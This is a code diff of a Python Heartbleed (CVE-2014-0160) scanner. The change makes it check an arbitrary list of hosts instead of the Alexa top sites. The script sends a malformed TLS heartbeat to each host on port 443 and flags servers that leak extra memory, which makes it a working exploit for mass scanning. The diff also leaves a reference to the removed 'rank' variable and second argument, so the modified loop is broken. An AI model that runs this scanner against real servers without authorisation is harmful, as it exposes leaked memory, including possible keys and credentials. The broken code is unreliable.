@@ -3,10 +3,9 @@
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
 
-# Quickly and dirtily modified by Mustafa Al-Bassam (mus@musalbas.com) to test
-# the Alexa top X.
+# Modified by bjm to more generically check a line-separated target list
 
-# Usage example: python ssltest.py top-1m.csv 10
+# Usage example: python ssltest.py targets.txt
 
 import sys
 import struct
@@ -16,7 +15,7 @@ import select
 import re
 from optparse import OptionParser
 
-options = OptionParser(usage='%prog file max', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains, takes in Alexa top X CSV file')
+options = OptionParser(usage='%prog file', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple hosts, takes a file as an argument')
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -49,8 +48,6 @@ def hexdump(s):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
-        #print '  %04x: %-48s %s' % (b, hxdat, pdat)
-    #print
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -77,14 +74,12 @@ def recvall(s, length, timeout=5):
 def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None:
-        #print 'Unexpected EOF receiving record header - server closed connection'
         return None, None, None
     typ, ver, ln = struct.unpack('>BHH', hdr)
     pay = recvall(s, ln, 10)
     if pay is None:
-        #print 'Unexpected EOF receiving record payload - server closed connection'
         return None, None, None
-    #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+
     return typ, ver, pay
 
 def hit_hb(s):
@@ -92,56 +87,44 @@ def hit_hb(s):
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            #print 'No heartbeat response received, server likely not vulnerable'
             return False
 
         if typ == 24:
-            #print 'Received heartbeat response:'
             hexdump(pay)
             if len(pay) > 3:
-                #print 'WARNING: server returned more data than it should - server is vulnerable!'
                 return True
             else:
-                #print 'Server processed malformed heartbeat, but did not return any extra data.'
                 return False
 
         if typ == 21:
-            #print 'Received alert:'
             hexdump(pay)
-            #print 'Server returned error, likely not vulnerable'
             return False
 
 def is_vulnerable(domain):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(2)
-    #print 'Connecting...'
-    #sys.stdout.flush()
+    s.settimeout(3)
+
     try:
         s.connect((domain, 443))
     except Exception, e:
         return None
-    #print 'Sending Client Hello...'
-    #sys.stdout.flush()
+
     s.send(hello)
-    #print 'Waiting for Server Hello...'
-    #sys.stdout.flush()
+
     while True:
         typ, ver, pay = recvmsg(s)
         if typ == None:
-            #print 'Server closed connection without sending Server Hello.'
             return None
         # Look for server hello done message.
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
 
-    #print 'Sending heartbeat request...'
-    #sys.stdout.flush()
     s.send(hb)
     return hit_hb(s)
 
 def main():
     opts, args = options.parse_args()
-    if len(args) < 2:
+    if len(args) < 1:
         options.print_help()
         return
 
@@ -151,19 +134,18 @@ def main():
 
     f = open(args[0], 'r')
     for line in f:
-        rank, domain = line.split(',')
-        domain = domain.strip()
-        print "Testing " + domain + "... ",
+        domain = line.strip()
+        print domain + ",",
         sys.stdout.flush();
         result = is_vulnerable(domain);
         if result is None:
-            print "no SSL."
+            print "No SSL."
             counter_nossl += 1;
         elif result:
-            print "vulnerable."
+            print "Vulnerable!"
             counter_vuln += 1;
         else:
-            print "not vulnerable."
+            print "Probably safe."
             counter_notvuln += 1;
 
         if int(rank) >= int(args[1]):
@@ -172,7 +154,7 @@ def main():
     print
     print "No SSL: " + str(counter_nossl)
     print "Vulnerable: " + str(counter_vuln)
-    print "Not vulnerable: " + str(counter_notvuln)
+    print "Probably safe: " + str(counter_notvuln)
 
 if __name__ == '__main__':
     main()
